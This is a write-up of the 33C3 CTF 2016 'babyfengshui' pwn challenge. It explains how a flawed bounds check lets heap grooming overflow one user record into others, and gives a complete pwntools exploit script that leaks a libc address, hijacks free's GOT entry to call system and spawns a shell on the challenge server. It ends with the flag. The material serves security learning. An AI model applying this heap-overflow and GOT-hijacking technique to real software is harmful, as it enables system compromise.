---
title: '33C3 CTF 2016 -- babyfengshui'
date: 2016-12-30 00:27
tags:
  - 33C3
  - CTF
  - Pwnable
  - heap_overflow
  - heap
  - Python
categories:
  - write-ups
---
**Category:** pwn
**Points:** 150

<!-- more -->  

32 bit ELF, with Partial RELRO, canary & NX enabled, No PIE  

program menu:
```
$ ./babyfengshui
0: Add a user
1: Delete a user
2: Display a user
3: Update a user description
4: Exit
```
Add a user:
```
Action: 0
size of description: 50 <-- max length of description
name: AAAA 
text length: 12 <-- actual length of description
text: 1234
```
Show a user:
```
Action: 2
index: 0 <-- user's index
name: AAAA
description: 1234
```
Update a user:
```
Action: 3
index: 0
text length: 10 <-- new length of the description
text: 1234567890
```
Here's the data structure of a user:
```c 
struct user{
    char* desc;
    char name[124];
};
```
The program will free `user->desc` & `user` while deleting a user. It also clear the pointer of the `user`, so there's no Use-After-Free vulnerability. 

The program has some strange protection while setting the user's description:
```c
// users = struct user *users[]
if ( &users[id]->desc[text_len] >= &users[id] - 4 )
{
    puts("my l33t defenses cannot be fooled, cya!");
    exit(1);
}
printf("text: ");
read_n(users[id]->desc, text_len + 1);
```
So `user->desc + text_len` must < `user` (both `user->desc` and `user` are pointers). Guess it use this protection to avoid heap overflow.

But what if we have the following heap memory layout?
```

            +-----------------------+
userD->desc |                       |
            |                       |
            +-----------------------+
            |            userB->desc| userB
            |                       |
            |                       |
            |                       |
            +-----------------------+
            |            userC->desc| userC
            |                       |
            |                       |
            |                       |
            +-----------------------+
            |            userD->desc| userD
            |                       |
            |                       |
            |                       |
            +-----------------------+
```
According to the protection, `userD->desc + text_len` should less than `userD`, **which means it will be ok to overwrite the whole `userB` and `userC`**.

It is possible to arrange the above heap memory layout if we're familiar with malloc's memory allocation. We can then exploit the heap overflow vulnerability and modify the `userB->desc` pointer, making us able to do the **read/write anywhere** attack. After that is pretty simple, we leak the libc's base address and hijack `free`'s GOT to get the shell.

```python exp_baby.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "78.46.224.83"
PORT = 1456
ELF_PATH = "./babyfengshui_noalarm"
LIBC_PATH = "./libc-2.19.so"

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def add_user(desc_len, name, text_len, text):
    r.sendlineafter("Action: ", "0")
    r.sendlineafter("description: ", str(desc_len))
    r.sendlineafter("name: ", name)
    r.sendlineafter("length: ", str(text_len))
    r.sendlineafter("text: ", text)

def del_user(index):
    r.sendlineafter("Action: ", "1")
    r.sendlineafter("index: ", str(index))

def show_user(index):
    r.sendlineafter("Action: ", "2")
    r.sendlineafter("index: ", str(index))

def update_user(index, text_len, text):
    r.sendlineafter("Action: ", "3")
    r.sendlineafter("index: ", str(index))
    r.sendlineafter("length: ", str(text_len))
    r.sendlineafter("text: ", text)

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)
    
    add_user(50, "A"*123, 12, "a"*12)
    add_user(50, "B"*123, 12, "b"*12) 
    add_user(50, "C"*123, 12, "sh\x00") # user[2], desc = "sh\x00" (for later's GOT hijacking)
    del_user(0)
    add_user(90, "D"*123, 12, "d"*12)
    add_user(50, "E"*123, 0x100, "i"*0xf8 + p32(elf.got['__libc_start_main'])) 
    # now user[4]'s desc is user[0]'s desc (in previous)
    # user[4]->desc + 0x2c8 = user[4], which means we can overflow user[4]->desc & overwrite user[1]->desc to libc_start_main@got.plt

    # leak address
    show_user(1)
    r.recvuntil("description: ")
    libc.address += u32(r.recv(4)) - libc.symbols['__libc_start_main']
    system_addr = libc.symbols['system']
    log.success("libc: "+hex(libc.address))
    log.success("system: "+hex(system_addr))
    
    # change user[1]->desc into free@got.plt
    # hijack free's got, then free user[2] to get shell
    update_user(4, 0x100, "i"*0xf8 + p32(elf.got['free']))
    update_user(1, 5, p32(system_addr))
    del_user(2)

    r.interactive()
```

flag: `33C3_h34p_3xp3rts_c4n_gr00m_4nd_f3ng_shu1`
